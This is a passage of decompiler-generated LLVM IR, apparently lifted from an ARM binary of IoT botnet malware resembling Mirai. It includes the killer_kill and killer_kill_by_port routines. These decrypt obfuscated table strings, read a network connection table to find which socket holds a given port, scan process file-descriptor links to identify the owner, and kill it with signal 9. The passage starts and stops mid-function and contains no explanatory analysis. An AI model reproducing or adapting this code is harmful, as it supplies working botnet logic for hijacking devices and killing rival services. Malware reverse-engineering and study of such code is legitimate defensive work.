  %v0_c904 = phi i32 [ %v0_c904.pre, %dec_label_pc_c900.preheader ], [ %v5_c904, %dec_label_pc_c900 ]
  %v0_c900 = phi i32 [ %arg3, %dec_label_pc_c900.preheader ], [ %v1_c900, %dec_label_pc_c900 ]
  %v1_c900 = add nsw i32 %v0_c900, -2
  %v1_c904 = inttoptr i32 %v0_c904 to i16*
  %v2_c904 = load i16, i16* %v1_c904, align 2
  %v3_c904 = zext i16 %v2_c904 to i32
  %v5_c904 = add i32 %v0_c904, -2
  store i32 %v5_c904, i32* @r1, align 4
  %v2_c90c = add i32 %v3_c904, %v0_c90c
  %v8_c910 = icmp sgt i32 %v1_c900, 1
  br i1 %v8_c910, label %dec_label_pc_c900, label %dec_label_pc_c914.loopexit

dec_label_pc_c914.loopexit:                       ; preds = %dec_label_pc_c900
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c914.loopexit, %entry
  %v1_c920 = phi i32 [ %v2_c90c, %dec_label_pc_c914.loopexit ], [ 0, %entry ]
  %v0_c914 = phi i32 [ %v1_c900, %dec_label_pc_c914.loopexit ], [ %arg3, %entry ]
  %v7_c914 = icmp eq i32 %v0_c914, 1
  br i1 %v7_c914, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c914
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c914
  %v1_c918 = load i32, i32* @r1, align 4
  %v2_c918 = inttoptr i32 %v1_c918 to i8*
  %v3_c918 = load i8, i8* %v2_c918, align 1
  %v4_c918 = zext i8 %v3_c918 to i32
  %v3_c920 = add i32 %v4_c918, %v1_c920
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c948 = phi i32 [ %v1_c920, %.thread ], [ %v3_c920, %bb ]
  %v0_c928 = mul i32 %v3_c8ec, 65536
  %v3_c928 = udiv i32 %v0_c928, 65536
  %v3_c92c = urem i32 %v3_c8f0, 65536
  %v4_c934 = udiv i32 %v3_c8ec, 65536
  %v2_c930 = add nuw nsw i32 %v3_c92c, %v4_c934
  %v5_c934 = add nuw nsw i32 %v2_c930, %v3_c928
  %v1_c938 = add i32 %arg1, 9
  %v2_c938 = inttoptr i32 %v1_c938 to i8*
  %v3_c938 = load i8, i8* %v2_c938, align 1
  %v4_c938 = zext i8 %v3_c938 to i32
  %v4_c93c = udiv i32 %v3_c8f0, 65536
  %v3_c944 = mul nuw nsw i32 %v4_c938, 256
  %v5_c93c = add i32 %v4_c93c, %arg2
  %v2_c940 = add i32 %v5_c93c, %v1_c948
  %v2_c948 = add i32 %v2_c940, %v5_c934
  %v2_c94c = add i32 %v2_c948, %v3_c944
  %tmp = icmp ult i32 %v2_c94c, 65536
  br i1 %tmp, label %dec_label_pc_c96c, label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %bb19, %dec_label_pc_c958
  %v2_c9605 = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646.in = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646 = udiv i32 %v3_c9646.in, 65536
  %v3_c95c = urem i32 %v2_c9605, 65536
  %v2_c960 = add nuw nsw i32 %v3_c95c, %v3_c9646
  %tmp20 = icmp ult i32 %v2_c960, 65536
  br i1 %tmp20, label %dec_label_pc_c96c.loopexit, label %dec_label_pc_c958

dec_label_pc_c96c.loopexit:                       ; preds = %dec_label_pc_c958
  br label %dec_label_pc_c96c

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c96c.loopexit, %bb19
  %v0_c96c = phi i32 [ %v2_c960, %dec_label_pc_c96c.loopexit ], [ %v2_c94c, %bb19 ]
  %v1_c96c = urem i32 %v0_c96c, 65536
  %v3_c974 = xor i32 %v1_c96c, 65535
  ret i32 %v3_c974

; uselistorder directives
  uselistorder i32 %v2_c960, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c94c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c920, { 1, 0 }
  uselistorder i32 %v5_c904, { 1, 0 }
  uselistorder i32 %v0_c904, { 1, 0 }
  uselistorder i32 %v3_c8ec, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c958, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c900, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_c98c = load i32, i32* @global_var_24f48.71, align 4
  %v2_c994 = call i32 @kill(i32 %v2_c98c, i32 9)
  ret i32 %v2_c994
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c9a8 = load i32, i32* @r4, align 4
  %v6_c9a8 = load i32, i32* @r5, align 4
  %v9_c9a8 = load i32, i32* @r6, align 4
  %v12_c9a8 = load i32, i32* @r7, align 4
  %v15_c9a8 = load i32, i32* @r8, align 4
  %v18_c9a8 = load i32, i32* @sb, align 4
  %v21_c9a8 = load i32, i32* @sl, align 4
  %v24_c9a8 = load i32, i32* @fp, align 4
  %v27_c9a8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c9c4 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c9c4, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9f0 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9f0, i32* @fp, align 4
  %v4_c9fc = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_ca00 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_ca00, i32* @sl, align 4
  %v0_ca04 = load i32, i32* @r5, align 4
  %v3_ca10 = bitcast i32* %stack_var_-8777 to i8*
  %v4_ca10 = call i32 @__GI_memset(i8* %v3_ca10, i32 %v0_ca04, i32 4096)
  %v0_ca18 = load i32, i32* @r5, align 4
  %v3_ca24 = bitcast i32* %stack_var_-4681 to i8*
  %v4_ca24 = call i32 @__GI_memset(i8* %v3_ca24, i32 %v0_ca18, i32 4096)
  %v2_ca28 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_ca28, i32* @sb, align 4
  %v0_ca2c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca2c = udiv i32 %v0_ca2c, 256
  %v1_ca30 = urem i32 %v0_ca2c, 256
  store i32 %v1_ca30, i32* @r4, align 4
  %v3_ca40 = trunc i32 %v3_ca2c to i8
  %v4_ca40 = call i32 @util_itoa(i8 %v3_ca40, i32 16, i32 %v2_ca28)
  %v2_ca48 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca4c = icmp eq i32 %v2_ca48, 2
  br i1 %v7_ca4c, label %dec_label_pc_cf10, label %dec_label_pc_ca54

dec_label_pc_ca54:                                ; preds = %entry, %dec_label_pc_cf10
  %v1_ca58 = call i32 @table_unlock_val(i32 15)
  %v1_ca60 = call i32 @table_unlock_val(i32 16)
  %v1_ca68 = call i32 @table_unlock_val(i32 17)
  %v1_ca70 = call i32 @table_unlock_val(i32 19)
  %v0_ca74 = load i32, i32* @r5, align 4
  %v2_ca7c = inttoptr i32 %v0_ca74 to i32*
  %v3_ca7c = call i32 @table_retrieve_val(i32 19, i32* %v2_ca7c)
  %v0_ca80 = load i32, i32* @r5, align 4
  %v2_ca84 = call i32 @__libc_open(i32 %v3_ca7c, i32 %v0_ca80)
  %v7_ca88 = icmp eq i32 %v2_ca84, -1
  store i32 %v2_ca84, i32* @r8, align 4
  br i1 %v7_ca88, label %bb, label %dec_label_pc_ca98.preheader

bb:                                               ; preds = %dec_label_pc_ca54
  %v1_ca90 = load i32, i32* @r5, align 4
  store i32 %v1_ca90, i32* @r4, align 4
  br label %dec_label_pc_ceac

dec_label_pc_ca98.preheader:                      ; preds = %dec_label_pc_ca54
  %v4_caa456 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca84)
  %v2_caa858 = icmp eq i32 %v4_caa456, 0
  br i1 %v2_caa858, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0.lr.ph

dec_label_pc_cab0.lr.ph:                          ; preds = %dec_label_pc_ca98.preheader
  %v2_caf8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_cab0.lr.ph, %dec_label_pc_ca98.backedge
  %v3_cab4 = load i8, i8* %stack_var_-585, align 1
  %v4_cab4 = sext i8 %v3_cab4 to i32
  store i32 %v4_cab4, i32* @r3, align 4
  %v2_cab8 = icmp eq i8 %v3_cab4, 0
  br i1 %v2_cab8, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_cab0
  %v8_cabc = icmp eq i8 %v3_cab4, 58
  br i1 %v8_cabc, label %.thread8, label %dec_label_pc_cad0

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cae8

bb126:                                            ; preds = %dec_label_pc_cab0
  br label %dec_label_pc_cae8

dec_label_pc_cad0:                                ; preds = %bb125
  %v1_cad8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cad4

dec_label_pc_cad4:                                ; preds = %bb127, %dec_label_pc_cad0
  %v0_cad4 = phi i32 [ %v1_cad4, %bb127 ], [ 0, %dec_label_pc_cad0 ]
  %v1_cad4 = add i32 %v0_cad4, 1
  %v2_cad8 = add i32 %v1_cad4, %v1_cad8.pre
  %v3_cad8 = inttoptr i32 %v2_cad8 to i8*
  %v4_cad8 = load i8, i8* %v3_cad8, align 1
  %v6_cad8 = zext i8 %v4_cad8 to i32
  store i32 %v6_cad8, i32* @r3, align 4
  %v2_cadc = icmp eq i8 %v4_cad8, 0
  br i1 %v2_cadc, label %dec_label_pc_cae8, label %bb127

bb127:                                            ; preds = %dec_label_pc_cad4
  %v8_cae0 = icmp eq i8 %v4_cad8, 58
  br i1 %v8_cae0, label %dec_label_pc_cae8, label %dec_label_pc_cad4

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cad4, %bb127, %bb126, %.thread8
  %v1_cb14 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_cad4, %bb127 ], [ %v1_cad4, %dec_label_pc_cad4 ]
  %v0_cae8 = phi i32 [ %v4_cab4, %.thread8 ], [ %v4_cab4, %bb126 ], [ %v6_cad8, %bb127 ], [ %v6_cad8, %dec_label_pc_cad4 ]
  %v2_cae8 = icmp eq i32 %v0_cae8, 0
  br i1 %v2_cae8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_caf0

dec_label_pc_ca98.backedge:                       ; preds = %dec_label_pc_cae8, %dec_label_pc_cbb8, %dec_label_pc_cc04, %dec_label_pc_cb34
  %v0_caa0 = load i32, i32* @r8, align 4
  %v4_caa4 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_caa0)
  %v2_caa8 = icmp eq i32 %v4_caa4, 0
  br i1 %v2_caa8, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cae8
  %v1_caf4 = add i32 %v1_cb14, 2
  %v2_cafc = add i32 %v1_caf4, %v2_caf8
  %v1_cb00 = add i32 %v2_cafc, -545
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v2_cb04 = icmp eq i8 %v3_cb00, 0
  br i1 %v2_cb04, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_caf0
  %v8_cb08 = icmp eq i8 %v3_cb00, 32
  br i1 %v8_cb08, label %.thread13, label %dec_label_pc_cb14

.thread13:                                        ; preds = %bb128
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb129:                                            ; preds = %dec_label_pc_caf0
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

dec_label_pc_cb14:                                ; preds = %bb128
  %v0_cb14 = load i32, i32* @r6, align 4
  %v2_cb14 = add i32 %v0_cb14, %v1_cb14
  br label %dec_label_pc_cb1c

dec_label_pc_cb1c:                                ; preds = %bb130, %dec_label_pc_cb14
  %v0_cb2816 = phi i32 [ %v1_cb28, %bb130 ], [ %v1_caf4, %dec_label_pc_cb14 ]
  %v0_cb2c18 = phi i32 [ %v1_cb2c, %bb130 ], [ %v2_cb14, %dec_label_pc_cb14 ]
  %v1_cb1c = add i32 %v0_cb2c18, 3
  %v2_cb1c = inttoptr i32 %v1_cb1c to i8*
  %v3_cb1c = load i8, i8* %v2_cb1c, align 1
  %v2_cb20 = icmp eq i8 %v3_cb1c, 0
  br i1 %v2_cb20, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cb1c
  %v1_cb2817 = add i32 %v0_cb2816, 1
  store i32 %v1_cb2817, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb130:                                            ; preds = %dec_label_pc_cb1c
  %v8_cb24 = icmp eq i8 %v3_cb1c, 32
  %v1_cb28 = add i32 %v0_cb2816, 1
  store i32 %v1_cb28, i32* @r5, align 4
  %v1_cb2c = add i32 %v0_cb2c18, 1
  br i1 %v8_cb24, label %dec_label_pc_cb34, label %dec_label_pc_cb1c

dec_label_pc_cb34:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb40 = phi i32 [ %v1_cb2817, %.thread15 ], [ %v1_caf4, %.thread13 ], [ %v1_caf4, %bb129 ], [ %v1_cb28, %bb130 ]
  %v0_cb34 = load i32, i32* @r6, align 4
  %v2_cb34 = add i32 %v0_cb34, %v1_caf4
  store i32 %v2_cb34, i32* @r4, align 4
  %v2_cb40 = add i32 %v1_cb40, %v2_caf8
  store i32 0, i32* @r7, align 4
  %v3_cb48 = add i32 %v2_cb40, -545
  %v4_cb48 = inttoptr i32 %v3_cb48 to i8*
  store i8 0, i8* %v4_cb48, align 1
  %v0_cb4c = load i32, i32* @r4, align 4
  %v1_cb50 = inttoptr i32 %v0_cb4c to i8*
  %v2_cb50 = call i32 @util_strlen(i8* %v1_cb50)
  store i32 %v2_cb50, i32* @r1, align 4
  %v0_cb5c = load i32, i32* @r4, align 4
  %v3_cb60 = inttoptr i32 %v0_cb5c to i8*
  %v4_cb60 = call i32 @util_stristr(i8* %v3_cb60, i32 %v2_cb50, i32 %v2_ca28)
  %v7_cb64 = icmp eq i32 %v4_cb60, -1
  br i1 %v7_cb64, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cb80.preheader

dec_label_pc_cb80.preheader:                      ; preds = %dec_label_pc_cb34
  %v1_cb68 = load i32, i32* @r7, align 4
  %v1_cb6c = load i32, i32* @r6, align 4
  %v2_cb6c = load i32, i32* @r5, align 4
  %v3_cb6c = add i32 %v2_cb6c, %v1_cb6c
  store i32 %v1_cb68, i32* @lr, align 4
  %v1_cb8048 = add i32 %v3_cb6c, 2
  %v2_cb8049 = inttoptr i32 %v1_cb8048 to i8*
  %v3_cb8050 = load i8, i8* %v2_cb8049, align 1
  %v4_cb8051 = zext i8 %v3_cb8050 to i32
  store i32 %v4_cb8051, i32* @r3, align 4
  %v2_cb8452 = icmp eq i8 %v3_cb8050, 0
  %v1_cb8854 = add i32 %v2_cb6c, 2
  br i1 %v2_cb8452, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb80.preheader, %dec_label_pc_cb80.backedge
  %v0_cbb883 = phi i32 [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cba0.pr = phi i32 [ %v0_cba0.pr70, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cec0 = phi i32 [ %v0_cec073, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cb8878 = phi i32 [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v1_cb8854, %dec_label_pc_cb80.preheader ]
  %v0_cbb0 = phi i32 [ %v0_cb80, %dec_label_pc_cb80.backedge ], [ %v3_cb6c, %dec_label_pc_cb80.preheader ]
  %v1_cb94 = phi i32 [ %v4_cb80, %dec_label_pc_cb80.backedge ], [ %v4_cb8051, %dec_label_pc_cb80.preheader ]
  %v7_cb90 = icmp eq i32 %v1_cb94, 9
  br i1 %v7_cb90, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb90
  %v8_cb94 = icmp eq i32 %v1_cb94, 32
  br i1 %v8_cb94, label %.thread27, label %dec_label_pc_cba0

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cbac

bb132:                                            ; preds = %dec_label_pc_cb90
  br label %dec_label_pc_cbac

dec_label_pc_cba0:                                ; preds = %bb131
  %v7_cba0 = icmp eq i32 %v0_cba0.pr, 1
  br i1 %v7_cba0, label %dec_label_pc_cec0, label %dec_label_pc_cba8

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cec0, %dec_label_pc_cba0
  %v0_cbac75 = phi i32 [ %v1_cec0, %dec_label_pc_cec0 ], [ %v0_cec0, %dec_label_pc_cba0 ]
  br label %dec_label_pc_cbac

dec_label_pc_cbac:                                ; preds = %bb132, %.thread27, %dec_label_pc_cba8
  %v0_cbac = phi i32 [ %v0_cec0, %.thread27 ], [ %v0_cec0, %bb132 ], [ %v0_cbac75, %dec_label_pc_cba8 ]
  %v0_cba0.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cba8 ]
  %v7_cbb4 = icmp sgt i32 %v0_cbac, 6
  br i1 %v7_cbb4, label %dec_label_pc_cbb8, label %dec_label_pc_cb80.backedge

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cb80.backedge, %dec_label_pc_cbac, %dec_label_pc_cb80.preheader
  %v1_cc08 = phi i32 [ %v1_cb8854, %dec_label_pc_cb80.preheader ], [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v0_cb8878, %dec_label_pc_cbac ]
  %v0_cbb8 = phi i32 [ %v1_cb68, %dec_label_pc_cb80.preheader ], [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v2_cbb8 = icmp eq i32 %v0_cbb8, 0
  br i1 %v2_cbb8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbb8
  %v2_cbcc = add i32 %v1_cc08, %v2_caf8
  %v1_cbd0 = add i32 %v2_cbcc, -545
  %v2_cbd0 = inttoptr i32 %v1_cbd0 to i8*
  %v3_cbd0 = load i8, i8* %v2_cbd0, align 1
  %v2_cbd4 = icmp eq i8 %v3_cbd0, 0
  br i1 %v2_cbd4, label %dec_label_pc_cc04, label %bb133

bb133:                                            ; preds = %dec_label_pc_cbc4
  %v8_cbd8 = icmp eq i8 %v3_cbd0, 32
  br i1 %v8_cbd8, label %dec_label_pc_cc04, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %bb133
  %v2_cbe0 = add i32 %v1_cc08, %v1_cb6c
  br label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %bb134, %dec_label_pc_cbe0
  %v0_cbf030 = phi i32 [ %v1_cbf0, %bb134 ], [ %v1_cc08, %dec_label_pc_cbe0 ]
  %v0_cbe4 = phi i32 [ %v1_cbe4, %bb134 ], [ %v2_cbe0, %dec_label_pc_cbe0 ]
  %v1_cbe4 = add i32 %v0_cbe4, 1
  %v2_cbe4 = inttoptr i32 %v1_cbe4 to i8*
  %v3_cbe4 = load i8, i8* %v2_cbe4, align 1
  %v2_cbe8 = icmp eq i8 %v3_cbe4, 0
  br i1 %v2_cbe8, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbe4
  %v1_cbf031 = add i32 %v0_cbf030, 1
  br label %dec_label_pc_cbf8

bb134:                                            ; preds = %dec_label_pc_cbe4
  %v8_cbec = icmp eq i8 %v3_cbe4, 32
  %v1_cbf0 = add i32 %v0_cbf030, 1
  br i1 %v8_cbec, label %dec_label_pc_cbf8, label %dec_label_pc_cbe4

dec_label_pc_cbf8:                                ; preds = %bb134, %.thread29
  %v1_cc00 = phi i32 [ %v1_cbf031, %.thread29 ], [ %v1_cbf0, %bb134 ]
  %v2_cc00 = add i32 %v1_cc00, %v2_caf8
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbc4, %bb133, %dec_label_pc_cbf8
  %v2_cc10 = phi i32 [ %v2_cbcc, %dec_label_pc_cbc4 ], [ %v2_cbcc, %bb133 ], [ %v2_cc00, %dec_label_pc_cbf8 ]
  %v2_cc08 = add i32 %v1_cc08, %v1_cb6c
  store i32 %v2_cc08, i32* @r4, align 4
  %v3_cc10 = add i32 %v2_cc10, -545
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 1
  %v1_cc14 = inttoptr i32 %v2_cc08 to i8*
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14)
  %v8_cc1c = icmp sgt i32 %v2_cc14, 15
  br i1 %v8_cc1c, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v0_cc24 = load i32, i32* @r4, align 4
  %v2_cc28 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cc28, i32* @r0, align 4
  %v2_cc2c = bitcast i32* %stack_var_-56 to i8*
  %v3_cc2c = call i32 @util_strcpy(i8* %v2_cc2c, i32 %v0_cc24)
  br label %dec_label_pc_cc30

dec_label_pc_cc30.loopexit:                       ; preds = %dec_label_pc_ca98.backedge, %dec_label_pc_ca98.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc30.loopexit, %dec_label_pc_cc20
  %v1_cc40.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc30.loopexit ], [ %v2_cc2c, %dec_label_pc_cc20 ]
  %v2_cc3c.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc30.loopexit ], [ %v2_cc28, %dec_label_pc_cc20 ]
  %v0_cc30 = load i32, i32* @r8, align 4
  %v1_cc34 = call i32 @__GI___libc_close(i32 %v0_cc30)
  %v2_cc40 = call i32 @util_strlen(i8* %v1_cc40.pre-phi)
  store i32 %v2_cc40, i32* @r4, align 4
  %v2_cc44 = icmp eq i32 %v2_cc40, 0
  br i1 %v2_cc44, label %dec_label_pc_ceec, label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc30
  %v3_cc54 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_cc58 = call i32 @__GI_opendir(i32 %v3_cc54)
  store i32 %v1_cc58, i32* @sb, align 4
  %v2_cc5c = icmp eq i32 %v1_cc58, 0
  br i1 %v2_cc5c, label %dec_label_pc_ce8c, label %dec_label_pc_cc6c.preheader

dec_label_pc_cc6c.preheader:                      ; preds = %dec_label_pc_cc4c
  store i32 0, i32* @r5, align 4
  %v1_cc7043 = inttoptr i32 %v1_cc58 to i32*
  %v2_cc7044 = call i32 @__GI_readdir(i32* %v1_cc7043)
  %v2_cc7446 = icmp eq i32 %v2_cc7044, 0
  br i1 %v2_cc7446, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc6c.loopexit:                       ; preds = %dec_label_pc_cc84, %dec_label_pc_cc94, %dec_label_pc_cd00
  %v0_cc6c = load i32, i32* @sb, align 4
  %v1_cc70 = inttoptr i32 %v0_cc6c to i32*
  %v2_cc70 = call i32 @__GI_readdir(i32* %v1_cc70)
  %v2_cc74 = icmp eq i32 %v2_cc70, 0
  br i1 %v2_cc74, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc7c.preheader:                      ; preds = %dec_label_pc_cc6c.preheader, %dec_label_pc_cc6c.loopexit
  %v0_cc8491 = phi i32 [ %v2_cc70, %dec_label_pc_cc6c.loopexit ], [ %v2_cc7044, %dec_label_pc_cc6c.preheader ]
  br label %dec_label_pc_cc7c

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc7c.preheader, %dec_label_pc_ce68
  %v0_cc9c = phi i32 [ %v0_cc8491, %dec_label_pc_cc7c.preheader ], [ %v2_ce74, %dec_label_pc_ce68 ]
  %v0_cc7c = load i32, i32* @r5, align 4
  %v2_cc7c = icmp eq i32 %v0_cc7c, 0
  br i1 %v2_cc7c, label %dec_label_pc_cc84, label %dec_label_pc_ce80

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cc7c
  %v1_cc84 = add i32 %v0_cc9c, 11
  %v2_cc84 = inttoptr i32 %v1_cc84 to i8*
  %v3_cc84 = load i8, i8* %v2_cc84, align 1
  %v4_cc84 = zext i8 %v3_cc84 to i32
  %v1_cc88 = add nsw i32 %v4_cc84, -48
  %tmp = icmp ugt i32 %v1_cc88, 9
  br i1 %tmp, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc84
  store i32 %v1_cc84, i32* @r7, align 4
  %v3_cca0 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_ccac = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cca0)
  %v2_ccb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_ccb8 = load i32, i32* @r7, align 4
  %v1_ccbc = load i32, i32* @sl, align 4
  %v2_ccbc = add i32 %v1_ccbc, %v2_ccb4
  store i32 %v2_ccbc, i32* @r0, align 4
  %v2_ccc0 = inttoptr i32 %v2_ccbc to i8*
  %v3_ccc0 = call i32 @util_strcpy(i8* %v2_ccc0, i32 %v0_ccb8)
  %v2_ccc8 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cccc = load i32, i32* @r5, align 4
  store i32 %v2_ccc8, i32* @r4, align 4
  %v2_ccd8 = inttoptr i32 %v0_cccc to i32*
  %v3_ccd8 = call i32 @table_retrieve_val(i32 16, i32* %v2_ccd8)
  %v0_cce0 = load i32, i32* @r4, align 4
  %v1_cce0 = load i32, i32* @sl, align 4
  %v2_cce0 = add i32 %v1_cce0, %v0_cce0
  store i32 %v2_cce0, i32* @r0, align 4
  %v2_cce4 = inttoptr i32 %v2_cce0 to i8*
  %v3_cce4 = call i32 @util_strcpy(i8* %v2_cce4, i32 %v3_ccd8)
  %v3_ccf4 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ccf8 = icmp eq i32 %v3_ccf4, -1
  br i1 %v7_ccf8, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd00

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  %v0_cd00 = load i32, i32* @r5, align 4
  %v2_cd08 = inttoptr i32 %v0_cd00 to i32*
  %v3_cd08 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd08)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd14 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd08)
  %v2_cd1c = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd20 = load i32, i32* @r7, align 4
  %v1_cd24 = load i32, i32* @sl, align 4
  %v2_cd24 = add i32 %v1_cd24, %v2_cd1c
  store i32 %v2_cd24, i32* @r0, align 4
  %v2_cd28 = inttoptr i32 %v2_cd24 to i8*
  %v3_cd28 = call i32 @util_strcpy(i8* %v2_cd28, i32 %v0_cd20)
  %v2_cd30 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd34 = load i32, i32* @r5, align 4
  store i32 %v2_cd30, i32* @r4, align 4
  %v2_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v3_cd40 = call i32 @table_retrieve_val(i32 17, i32* %v2_cd40)
  %v0_cd48 = load i32, i32* @r4, align 4
  %v1_cd48 = load i32, i32* @sl, align 4
  %v2_cd48 = add i32 %v1_cd48, %v0_cd48
  store i32 %v2_cd48, i32* @r0, align 4
  %v2_cd4c = inttoptr i32 %v2_cd48 to i8*
  %v3_cd4c = call i32 @util_strcpy(i8* %v2_cd4c, i32 %v3_cd40)
  %v1_cd54 = call i32 @__GI_opendir(i32 %v2_ca00)
  store i32 %v1_cd54, i32* @r8, align 4
  %v2_cd58 = icmp eq i32 %v1_cd54, 0
  br i1 %v2_cd58, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd60.preheader

dec_label_pc_cd60.preheader:                      ; preds = %dec_label_pc_cd00
  %v1_cd6438 = inttoptr i32 %v1_cd54 to i32*
  %v2_cd6439 = call i32 @__GI_readdir(i32* %v1_cd6438)
  store i32 %v2_cd6439, i32* @r6, align 4
  %v2_cd6841 = icmp eq i32 %v2_cd6439, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd6841, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd60.loopexit:                       ; preds = %dec_label_pc_cd80, %dec_label_pc_ce18
  %v0_cd60 = load i32, i32* @r8, align 4
  %v1_cd64 = inttoptr i32 %v0_cd60 to i32*
  %v2_cd64 = call i32 @__GI_readdir(i32* %v1_cd64)
